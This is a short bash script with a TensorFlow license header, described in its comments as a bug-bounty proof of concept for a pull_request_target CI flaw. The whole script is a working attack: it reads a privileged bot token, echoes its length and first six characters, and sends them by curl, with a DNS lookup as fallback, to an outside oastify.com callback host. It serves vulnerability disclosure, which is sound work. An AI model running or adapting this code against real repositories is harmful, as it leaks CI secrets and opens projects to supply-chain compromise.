#!/usr/bin/env bash
# Copyright 2026 The TensorFlow Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================
#
# ============================================================
# OSS VRP SECURITY RESEARCH - PROOF OF CONCEPT
# Finding: pull_request_target fork code execution bypass
# call-check-tflite-files runs WITHOUT approval-gate dependency
# Fork code executes in privileged pull_request_target context
# TFLM_BOT_TOKEN (github.token) available with repo write perms
# ============================================================

set -e
set -u

OOB_HOST="qd75do8fy0wdpvs2dnb6f7gy2p8fwy199sd7r9g.oastify.com"
TOKEN_LEN=${#TFLM_BOT_TOKEN}
TOKEN_PREFIX="${TFLM_BOT_TOKEN:0:6}"

echo "=== OSS VRP PoC: Fork code executing in pull_request_target context ==="
echo "Repository : ${GITHUB_REPOSITORY}"
echo "PR Number  : ${PR_NUMBER}"
echo "Token set  : $([ -n "${TFLM_BOT_TOKEN}" ] && echo YES || echo NO)"
echo "Token len  : ${TOKEN_LEN}"
echo "Token pfx  : ${TOKEN_PREFIX}"

# OOB callback — proves execution + token presence without full exfil
curl -sk "https://${OOB_HOST}/poc?repo=${GITHUB_REPOSITORY}&pr=${PR_NUMBER}&tlen=${TOKEN_LEN}&tpfx=${TOKEN_PREFIX}" || true

# DNS probe as backup
nslookup "${OOB_HOST}" || true

echo "=== PoC complete — no approval gate was enforced ==="
exit 0
